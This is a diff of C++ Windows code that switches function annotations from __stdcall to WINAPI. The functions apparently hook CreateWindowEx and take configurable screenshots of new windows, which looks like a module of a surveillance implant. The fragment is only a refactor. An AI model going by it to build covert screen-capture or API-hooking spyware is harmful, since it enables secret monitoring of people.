@@ -23,18 +23,16 @@ DWORD image_quality = SNAP_IMG_QUALITY_MED;
 
 CreateWindowExStruct CreateWindowExData;
 
-HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
-								 LPCTSTR lpClassName,
-								 LPCTSTR lpWindowName,
-								 DWORD dwStyle,
-								 int x,
-								 int y,
-								 int nWidth,
-								 int nHeight,
-								 HWND hWndParent,
-								 HMENU hMenu,
-								 HINSTANCE hInstance,
-								 LPVOID lpParam) 
+HWND WINAPI PM_CreateWindowEx(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName,
+	DWORD dwStyle,
+	int x,
+	int y,
+	int nWidth,
+	int nHeight,
+	HWND hWndParent,
+	HMENU hMenu,
+	HINSTANCE hInstance,
+	LPVOID lpParam) 
 {
 	BOOL *Active;
 
@@ -53,7 +51,7 @@ HWND __stdcall PM_CreateWindowEx(DWORD dwExStyle,
 	return (HWND)ret_code;
 }
 
-DWORD PM_CreateWindowEx_setup(HMServiceStruct *pData)
+DWORD WINAPI PM_CreateWindowEx_setup(HMServiceStruct *pData)
 {
 	CreateWindowExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
 	CreateWindowExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
@@ -63,7 +61,7 @@ DWORD PM_CreateWindowEx_setup(HMServiceStruct *pData)
 
 // In realta' serve per l'evento on_new_window ma deve essere un dispatcher quindi l'ho lasciato qui
 // per motivi "storici"...lo so fa cagare...
-DWORD __stdcall PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
+DWORD WINAPI PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
 	char buff[1024];
 
@@ -74,14 +72,14 @@ DWORD __stdcall PM_NewWindowDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILE
 	return 1;
 }
 
-DWORD __stdcall PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_SnapShotStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	if (bStartFlag && bReset) 
 		TakeSnapShot(NULL, capture_only_window, image_quality);
 	return 1;
 }
 
-DWORD __stdcall PM_SnapShotInit(JSONObject elem)
+DWORD WINAPI PM_SnapShotInit(JSONObject elem)
 {
 	capture_only_window = (BOOL) elem[L"onlywindow"]->AsBool();
 	if (!wcscmp(elem[L"quality"]->AsString().c_str(), L"hi") ) {
